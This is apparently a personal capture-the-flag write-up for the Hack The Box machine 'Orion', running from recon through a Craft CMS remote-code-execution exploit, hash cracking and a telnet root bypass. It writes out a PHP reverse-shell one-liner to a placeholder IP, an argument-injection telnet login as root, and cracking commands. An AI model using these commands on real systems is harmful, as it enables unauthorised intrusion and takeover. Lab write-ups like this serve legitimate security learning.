Orion (HTB) write-up⌗

I am taking a different approach for this write-up than usual. A more stream of conciousness style approach so that when I revisit it I can try to understand the thought process and learn how to/not to think.

Initial Recon:⌗

As expected port 22 and 80 are open, doing a sV scan. Added to /etc/hosts. In-depth scan shows nginx running:

Nmap result:⌗ 

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Webpage looks vibe coded. Uses Craft CMS (could be attack vector). Starting with gobuster to find suddirectories.

Gobuster found /admin which runs Craft CMS 5.6.16 which is vulnerable to RCE (CVE-2025-32432) due to a bug in the /actions/assets/generate-transform URI where it can be exploited using POST requests.

For valid asset id it gives 302 and for invalid it gives 404, this enumeration is the further exploited by uploading php code. Read more: https://sensepost.com/blog/2025/investigating-an-in-the-wild-campaign-using-rce-in-craftcms/

Found a PoC on gihub, testing it out now (Didn’t work): https://github.com/CTY-Research-1/CVE-2025-32432-PoC.git The exploit shows it can’t parse the output, trying to do a reverse shell to see if we get response. Found reverse shell cheat sheet online, using nc -lvnp 9999 to listen, testing all to see which one works.

Previous exploit didn’t work probably, trying https://github.com/cd-ratel/CVE-2025-32432.git. That exploit didn’t work either but it did give me the vulnerable asset ID 2 which could be useful.

Using a different one to confirm https://github.com/TheMursalin/CVE-2025-32432.git.

Cheated a little but found out that using msfconsole works, trying it out. It worked and I got a meterpreter session (Finding asset ID 2 was useful afterall)! Now trying to get a proper shell using reverse-shell cheat sheet. Used reverse-shell cheat sheet to get a bash shell via netcat, then used:

- python3 -c 'import pty; pty.spawn("/bin/bash")'
- Ctrl+Z
- stty raw -echo; fg; reset
- export TERM=xterm-256color

You’ll get a stable shell!

Use php for reverse shell as it is more stable than the bash reverse shell on this machine.

php -r '$sock=fsockopen("YOUR-IP",9999);exec("/bin/sh -i <&3 >&3 2>&3");'

A database password, using mysql I found a few databases, in Orion the user table has:

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

Used John the Ripper to get the password, it is BCrypt, a quick google search and the $2y gives it away:

john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

We got the password as darkangel and we now have an ssh session as adam! The user flag is revealed.

Running linpeas again as adam to see if we get some potential attack vectors:

  • sudo 1.9.9
  • CVE-2021-4034 (High prob) - Failed
  • CVE-2026-41651 (Not proper priv esc though)

Lesson learned: first check which services are running (like ports), check their versions and then try to find exploits. If it fails then go for linpeas.

Did cheat a little but found out that port 23 (telnet) was running, checking it’s version I found that it is vulnerable (CVE-2026-24061).

If I first ran sudo -l, I would have figured out that adam does not have sudo permission at all and I could’ve avoided using linpeas at first.

Following this blog to understand and exploit: https://www.offsec.com/blog/cve-2026-24061/

Since the port is running locally we use 127.0.0.1 as our IP

USER='-f root' telnet -a 127.0.0.1

And we got root shell!
